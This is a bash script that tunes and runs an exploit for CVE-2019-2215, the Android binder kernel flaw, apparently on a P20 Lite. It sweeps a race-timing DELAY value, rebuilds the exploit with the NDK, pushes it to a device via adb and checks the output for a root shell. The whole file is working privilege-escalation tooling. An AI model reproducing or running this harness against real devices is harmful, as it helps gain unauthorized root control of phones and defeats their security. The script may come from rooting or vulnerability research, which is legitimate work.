#!/bin/bash
# Build the exploit with several DELAY values and run each until one reaches root.
# CVE-2019-2215's race is tuned by the DELAY constant (usleep between the parent's
# write and the child's resume). Rebuilding shifts the effective window, so the
# value that works is build- and load-dependent. Sweep it.
set -u
cd /home/placeless/dev/p20lite-cve
NDK=$(ls -d ~/Android/Sdk/ndk/*/ 2>/dev/null | head -1)
HDR=exploit/include/cve_2019_2215.h

for D in 25 40 50 65 75 90 100 125 150 200; do
  echo "############ DELAY=$D"
  # set the DELAY define
  python3 - "$D" <<'PY'
import re,sys
d=sys.argv[1]
p='/home/placeless/dev/p20lite-cve/exploit/include/cve_2019_2215.h'
s=open(p).read()
s=re.sub(r'#define DELAY \d+u', f'#define DELAY {d}u', s)
open(p,'w').write(s)
PY
  grep -n "define DELAY" "$HDR"

  ${NDK}ndk-build -j4 NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk \
      APP_PLATFORM=android-28 APP_ABI=arm64-v8a >/dev/null 2>&1
  if [ ! -f libs/arm64-v8a/cve-2019-2215 ]; then echo "  build failed"; continue; fi

  timeout 60 adb push libs/arm64-v8a/cve-2019-2215 /data/local/tmp/cve-2019-2215 2>&1 | tail -1
  timeout 30 adb shell 'chmod 755 /data/local/tmp/cve-2019-2215'

  printf 'id\ncat /proc/self/attr/current\n' | timeout 180 adb shell /data/local/tmp/cve-2019-2215 > "/tmp/sweep_$D.out" 2>&1
  if grep -q "uid=0(root)" "/tmp/sweep_$D.out"; then
    echo "  >>>>>> ROOT WITH DELAY=$D <<<<<<"
    cp "/tmp/sweep_$D.out" /tmp/sweep_success.out
    echo "$D" > /tmp/winning_delay.txt
    break
  fi
  echo "  no root (lines $(wc -l < /tmp/sweep_$D.out), last: $(tail -1 /tmp/sweep_$D.out | cut -c1-50))"
done

echo
echo "=== winner: $(cat /tmp/winning_delay.txt 2>/dev/null || echo none) ==="
[ -f /tmp/sweep_success.out ] && tail -14 /tmp/sweep_success.out
